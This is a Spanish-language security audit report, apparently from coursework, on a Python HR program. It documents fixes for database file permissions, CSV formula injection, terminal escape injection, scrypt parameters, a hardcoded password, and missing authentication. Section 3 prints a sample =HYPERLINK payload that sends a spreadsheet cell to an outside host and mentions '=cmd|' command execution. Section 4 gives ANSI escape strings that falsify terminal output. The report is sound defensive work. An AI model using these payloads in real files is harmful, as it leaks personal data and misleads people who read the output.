# Segunda auditoría de seguridad — EcoTech Solutions

**Caso EcoTech Solutions · Evaluación Sumativa 2, Unidad 2 · TI3V21**
**Fecha:** 12 de septiembre de 2026 · **Alcance:** `ecotech.py` y `main.py`

Continúa `AUDITORIA.md`, del 11 de septiembre, que cubrió inyección SQL, path traversal, el
`OverflowError` del menú, la cobertura de los permisos y el predicado `isdigit()`. Esta segunda
pasada entra en los frentes que la primera se declaró fuera de alcance o no revisó: **permisos del
archivo de la base, salida hacia contextos que interpretan el dato, calidad del hash de claves y
autenticación**.

Mismo método que la primera: ejecutar el ataque, no opinar sobre el código. Cada hallazgo trae su
reproducción y se puede repetir delante del docente.

**Resultado: tres hallazgos graves y cuatro de gravedad media. Se corrigieron seis. El séptimo es la
ausencia de autenticación, que se documenta y no se implementa, y las razones están en la sección 7.**

| # | Hallazgo | Gravedad | Estado |
|---|---|---|---|
| 1 | La base de datos quedaba legible por cualquier usuario del equipo | Grave | **Corregido** |
| 2 | El CSV exportado entregaba fórmulas ejecutables a la planilla | Grave | **Corregido** |
| 3 | Los campos de texto aceptaban secuencias de escape de terminal | Media | **Corregido** |
| 4 | El costo de `scrypt` estaba en el ejemplo de la documentación | Media | **Corregido** |
| 5 | El hash guardado no registraba con qué parámetros se calculó | Media | **Corregido** |
| 6 | Clave literal escrita en el código fuente de `main.py` | Media | **Corregido** |
| 7 | No existe autenticación: nadie verifica quién dice ser el administrador | Grave | Se documenta |
| 8 | `cambiar_clave` no persiste y `verificar_clave` confiaba en el formato | Observación | Parcial |
| — | XSS y cabeceras de seguridad | — | **No aplican** |

---

## 1. Por qué no hay XSS ni cabeceras que revisar

El encargo pedía siete frentes. Dos no existen en este entregable y conviene decir por qué antes de
que parezcan omitidos:

- **XSS.** Requiere un navegador que interprete HTML. Aquí no hay servidor, ni plantillas, ni una
  sola cadena de HTML: la salida es `print()` a una terminal.
- **Cabeceras de seguridad.** `Content-Security-Policy`, `X-Frame-Options` y compañía son
  cabeceras de respuesta HTTP. No hay HTTP en el programa.

Inventar una capa web para poder aplicarlas sería agregar código que la rúbrica no pide.

**Pero el problema de fondo del XSS sí está aquí, y en dos lugares.** El XSS no es un problema de
navegadores: es un dato no confiable entregado a algo que lo interpreta. En este sistema hay dos
intérpretes, y los dos estaban desprotegidos. Son los hallazgos 2 y 3.

| Contexto que interpreta | Qué inyecta | Hallazgo |
|---|---|---|
| Navegador | HTML y JavaScript | No aplica |
| Planilla de cálculo, al abrir el CSV | Fórmulas | 2 |
| Terminal, al listar la dotación | Secuencias de escape ANSI | 3 |

---

## 2. Defecto 1 — La base quedaba legible por todo el equipo · corregido

### Qué pasaba

SQLite crea el archivo con modo `0644`. Cualquier usuario de la máquina podía leer `ecotech.db`, y
adentro están los sueldos de la dotación. Cuando la Unidad 3 escriba la tabla `usuario`, ahí también
estarán los hashes de las claves.

```
$ python3 -c "import sqlite3; sqlite3.connect('demo.db').close()"
$ stat -c '%a' demo.db
644
```

El encapsulamiento de `Empleado.__salario` y el control de acceso de `obtener_salario()` protegen el
dato mientras se pasa por el programa. No protegen nada si el archivo se puede abrir con cualquier
otra herramienta. Era la puerta de atrás del indicador 2.1.2.

### Cómo se corrigió

`crear_tablas()` ajusta el archivo a `0600` después de crear el esquema. Va ahí porque es el único
punto por el que la base nace, y el menú lo llama en cada arranque, así que también corrige una base
que ya existiera con permisos abiertos.

El `chmod` atrapa `OSError` e imprime una advertencia en vez de propagar. El `except` de arranque de
`main.py` es `sqlite3.Error`, que no es pariente de `OSError`: dejarlo propagar mataría el programa
con traceback, justo lo que prohíbe el indicador 2.1.4.G.7.

### Evidencia después

```
$ rm -f ecotech.db && printf 's\n0\n' | python3 main.py > /dev/null
$ ls -l ecotech.db
-rw------- 1 xaski xaski 45056 sep 12 14:32 ecotech.db
```

---

## 3. Defecto 2 — Inyección de fórmulas en el CSV exportado · corregido

### Qué pasaba

`Informe.exportar` escribía cada línea del informe tal como venía. El contenido del informe sale de
`obtener_resumen()`, que emite nombres y direcciones tecleados por el usuario. Una planilla evalúa
como fórmula toda celda que empieza con `=`, `+`, `-` o `@`.

```
$ python3 -c "import csv; csv.writer(open('demo.csv','w',newline='')).writerows([['=1+1'],['@SUM(A1:A9)']])"
$ cat demo.csv
=1+1
@SUM(A1:A9)
```

Un empleado registrado como `=HYPERLINK("http://sitio.cl?d="&A1,"Ver")` filtra la celda de al lado
al servidor del atacante cuando alguien de recursos humanos abre el informe. Con `=cmd|...` la
familia de ataques llega a ejecución de comandos en Excel.

`csv.writer` no protege de esto, y es un malentendido frecuente: escapa lo que rompería el **formato**
del archivo, las comas y las comillas. No toca lo que la planilla **interpreta** después. Son dos
problemas distintos y hacen falta las dos defensas.

### Cómo se corrigió

Una función de módulo, `sin_formula()`, antepone un apóstrofo cuando el valor empieza con uno de los
cinco caracteres peligrosos, y `exportar()` la aplica a cada celda.

Va en la salida y no en la validación de entrada, por la misma razón por la que el HTML se escapa al
imprimir y no al guardar: un apellido puede empezar con guion legítimamente, y el problema no es el
dato sino quien lo interpreta. Guardar el apóstrofo en la base ensuciaría el dato para siempre por
culpa de un formato de salida.

### Evidencia después

La autoverificación exporta un informe con dos fórmulas y un nombre normal, y comprueba las tres
celdas:

```python
informe = Informe("Dotación", ["=1+1", "@SUM(A1:A9)", "Juanita Bravo"])
informe.exportar("dotacion.csv")
# fila 1: '=1+1          ← neutralizada
# fila 2: '@SUM(A1:A9)   ← neutralizada
# fila 3: Juanita Bravo  ← intacta
```

La tercera línea importa tanto como las dos primeras: una defensa que altera datos que no eran
peligrosos es una defensa que corrompe el informe.

---

## 4. Defecto 3 — Secuencias de escape de terminal en los campos de texto · corregido

### Qué pasaba

`texto()` aceptaba cualquier carácter de control, y el menú vuelve a imprimir esos textos al listar
departamentos y empleados. Un nombre de departamento guardado como `Legal\x1b[2J` borra la pantalla
de quien lista. Con `\x1b[1A` se puede sobrescribir la línea anterior y mentir sobre lo que hay en
la base, que es lo grave: falsear la salida de un sistema de gestión de personal.

El correo estaba peor, porque la expresión regular parecía cubrirlo y no lo hacía. `\x1b` no es un
carácter de espacio, así que no lo excluía `\s`:

```
$ # con la regex anterior
$ python3 -c "import re; print(bool(re.fullmatch(r'[^@\s]+@[^@\s]+\.[^@\s]+', 'j\x1b[2Jbravo@ecotech.cl')))"
True
```

### Cómo se corrigió

Dos guardas, en los dos únicos caminos por los que entra texto:

| Dónde | Qué rechaza |
|---|---|
| `texto()` | Todo carácter con código menor a 32, más el 127. Cubre nombre, dirección y las dos descripciones, porque es la única puerta de todo texto obligatorio |
| `PATRON_CORREO` | Se sumó `\x00-\x1f\x7f` a las tres clases negadas |

`PATRON_TELEFONO` y `PATRON_USUARIO` no admiten caracteres de control por su propia forma, así que
no se tocaron. Con la regex corregida el mismo correo de arriba da `False`.

Rechaza en vez de limpiar, para ser coherente con el resto del archivo: toda validación de dominio
levanta `ValueError` con el campo nombrado, y el menú ya sabe mostrarlo.

---

## 5. Defecto 4 y 5 — El hash de claves · corregido

### Qué pasaba

Dos cosas, y las dos son de diseño más que de programación.

**El costo era el del ejemplo de la documentación.** `scrypt` corría con `n=2**14`, que es lo que
trae la página de `hashlib`. OWASP pide hoy `2**17` como mínimo para `scrypt`. Medido en este
equipo:

| Parámetros | Tiempo por hash | Memoria por hash |
|---|---|---|
| `n=2**14`, el anterior | 57 ms | 16 MB |
| `n=2**16`, el vigente | 248 ms | 64 MB |

El número que importa no es el tiempo de un hash, es el de un millón: cuadruplicar el costo
cuadruplica lo que le cuesta al atacante probar el diccionario completo.

**El hash no registraba sus propios parámetros.** El formato guardado era `scrypt$sal$hash`. Sin `n`,
`r` ni `p` escritos, subir el costo mañana deja sin poder verificar todos los hashes de hoy, porque
nada dice con qué parámetros se calcularon. Es una vía muerta de migración, y la trampa está en que
no se nota hasta que ya hay usuarios registrados.

### Cómo se corrigió

- `Usuario.COSTO` es ahora `(2**16, 8, 1)`, y hay que pasar `maxmem` explícito: el límite por
  omisión de OpenSSL son 32 MB y `hashlib.scrypt` levanta `ValueError` sin él.
- El formato pasó a `scrypt$n$r$p$sal$hash`, y `verificar_clave` lee los parámetros de ahí en vez de
  asumirlos. Un hash viejo con otro costo seguiría verificándose.
- Quedó en `2**16` y no en `2**17` a propósito: `2**17` son 134 MB y casi un segundo por hash, y la
  autoverificación hace cinco. Se prefirió que corra en un segundo delante del docente. La constante
  está en un solo lugar y subirla es cambiar un número.

**Se hizo ahora porque ahora es gratis.** Nada escribe todavía la tabla `usuario`, así que no hay un
solo hash guardado que migrar. El mismo cambio después de la Unidad 3 obliga a rehashear a todos.

---

## 6. Defecto 6 — Clave literal en el código fuente · corregido

`main.py` construía el solicitante fijo con la clave `"Clave-RRHH-2026"` escrita en el archivo. Una
credencial en el código viaja al zip de la entrega y al repositorio, y queda en el historial para
siempre aunque después se borre la línea.

Se reemplazó por `secrets.token_urlsafe(24)` más un sufijo que garantiza las cuatro familias de
caracteres que exige `_validar_clave`. Sin el sufijo el constructor rechazaría la clave generada una
vez cada tantos arranques, porque `token_urlsafe` puede no traer ningún dígito.

Es la corrección correcta y no un parche porque **esa clave no se usa para nada**: sin login, del
objeto solo se llama `tiene_permiso()`. Una clave al azar sirve igual y no hay secreto que filtrar.

Los literales de la autoverificación se quedan. Ahí la clave conocida es el dato de prueba, y uno de
los `assert` comprueba justamente que no quede en claro dentro del objeto.

---

## 7. Hallazgo 7 — No hay autenticación · se documenta

**Este es el hallazgo más grave del informe y el único que no se corrige.**

La tabla `usuario` existe en el esquema, con su `UNIQUE` sobre el nombre y su `CHECK` sobre el rol, y
ningún código la escribe. El solicitante del menú se construye fijo al arrancar. La consecuencia
exacta, dicha sin adornos: **los permisos de `autorizar()` protegen contra el uso incorrecto, no
contra un atacante**, porque nadie verifica que quien dice ser administrador lo sea. Cualquiera que
pueda ejecutar `main.py` es administrador de recursos humanos.

No se implementa por tres razones, en este orden:

1. **Es Unidad 3.** El inicio de sesión es materia de la unidad siguiente y la evaluación en curso
   no lo evalúa.
2. **Rompería la correspondencia con el diagrama.** `Usuario` tiene cinco métodos en el UML.
   Agregarle `guardar`, `buscar_por_nombre` y `autenticar` lo deja con ocho, y el criterio 2.1.1
   descuenta por cada método que el código tiene y el diagrama no. El lugar correcto para abrir esa
   puerta es el diagrama, no el código.
3. **Contradiría la documentación entregada.** La sección 8 de `AUDITORIA.md` y el guion de defensa
   ya declaran esta ausencia como decisión consciente. Cambiarla a cuatro días del cierre deja los
   tres documentos diciendo cosas distintas.

**El diseño recomendado, para cuando toque.** Es la única parte de este informe que describe trabajo
futuro, y va escrita para que no haya que volver a pensarla:

- `Usuario.guardar()` y `Usuario.buscar_por_nombre()`, con el mismo patrón de CRUD de las otras
  clases, escribiendo `hash_clave` tal como lo produce `_hashear`.
- Un `autenticar(nombre, clave)` que devuelva el `Usuario` o `None`, y que **tarde lo mismo con un
  usuario inexistente que con una clave equivocada**: si devuelve rápido cuando el usuario no
  existe, el tiempo de respuesta delata qué cuentas existen. Se resuelve verificando siempre contra
  un hash, real o señuelo.
- Un contador de intentos fallidos por cuenta, con bloqueo temporal. Sin eso, la política de claves
  del hallazgo 4 protege del diccionario offline pero no de probar en vivo contra el menú.
- El `solicitante` del menú pasa a ser el usuario autenticado, y `main.py` deja de construirlo.

---

## 8. Hallazgo 8 — Dos defectos latentes en `Usuario` · parcial

Los dos existen hoy y ninguno es alcanzable, porque la clase no se persiste. Se listan porque se
vuelven reales el día que el hallazgo 7 se implemente.

- **`cambiar_clave` no persiste.** Cambia el atributo en memoria y no escribe. Con CRUD, un cambio
  de clave se perdería al cerrar el programa y el usuario volvería a entrar con la anterior. Se
  corrige cuando exista el `UPDATE` donde escribirlo, no antes.
- **`verificar_clave` confiaba en el formato del hash.** Desempacaba en tres variables, así que un
  hash corrupto en la base reventaba con un error de desempaque que no explicaba nada. **Esto sí se
  corrigió**, de paso con el hallazgo 5: ahora comprueba el formato y levanta un `ValueError`
  redactado, que el menú ya sabe mostrar.

---

## 9. Lo que esta auditoría dejó fuera

- **Cifrado de los datos en reposo.** Ya declarado fuera por la primera auditoría. El `chmod` del
  hallazgo 1 es la mitigación que sí cabe: no cifra, pero saca el archivo del alcance de los demás
  usuarios del equipo.
- **Concurrencia.** Sin cambios respecto de la primera auditoría.
- **`Informe.exportar` no es alcanzable desde el menú.** El hallazgo 2 se corrigió igual, porque la
  clase es parte del entregable y cualquier script que la use hereda el problema. Pero conviene
  saberlo: hoy nadie exporta desde la interfaz.
- **La carpeta de destino de la exportación depende del directorio de trabajo.** `exportar()` valida
  contra `Path.cwd()`, así que qué es «dentro» cambia según desde dónde se lance el programa. La
  guarda contra path traversal funciona en los dos casos; lo que varía es cuál es la carpeta
  permitida.

---

## 10. Cómo repetir esta auditoría

```bash
cd ecotech_new
rm -f ecotech.db
python3 ecotech.py            # autoverificación completa, imprime OK en ~1 s
ls -l ecotech.db              # tiene que decir -rw-------
python3 main.py               # s para sembrar, 2 y 6 para listar, 0 para salir
```

La autoverificación de `ecotech.py` quedó ampliada con los casos de esta pasada: el escape de
terminal por un campo de texto y por el correo, los permisos de la base, el formato del hash con su
costo, el hash corrupto y las tres celdas del CSV exportado. Si alguien afloja una guarda, un
`assert` se cae.

El espejo comentado tiene que seguir siendo el mismo código:

```bash
diff <(sed '/^[[:space:]]*#/d; /^[[:space:]]*$/d' ecotech.py) \
     <(sed '/^[[:space:]]*#/d; /^[[:space:]]*$/d' comentado/ecotech.py)
```
